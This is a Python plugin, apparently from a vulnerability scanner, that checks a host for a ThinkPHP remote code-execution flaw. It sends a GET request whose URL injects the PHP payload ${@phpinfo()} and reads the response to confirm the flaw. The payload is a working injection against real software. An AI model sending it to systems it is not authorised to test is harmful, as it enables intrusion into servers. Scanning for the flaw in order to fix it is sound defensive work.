# coding=utf-8
import requests

def get_plugin_info():
    plugin_info = {
        "name": "ThinkPHP框架代码执行漏洞",
        "info": "攻击者可利用${@phpinfo()}构造代码进行入侵，获得服务器权限",
        "level": "高危",
        "type": "代码执行",
        "author": "zhangdaoyuan@banggood.com",
        "url": "https://github.com/ym2011/POC-EXP/blob/master/thinkphp/thinkphpCodeEXE.py",
        "keyword": "tag:php",
        "source": 1
    }
    return plugin_info

def check(ip, port, timeout):
    url = "http://" + ip +":" + port + "/index.php/module/aciton/param1/${@phpinfo()}"
    try:
        r = requests.get(url, timeout=timeout)
    except Exception:
        pass
    else:
        r.close()
        if r.status_code == 200 and "<title>phpinfo()</title>" in r.text:
            return u"ThinkPHP框架代码执行漏洞"



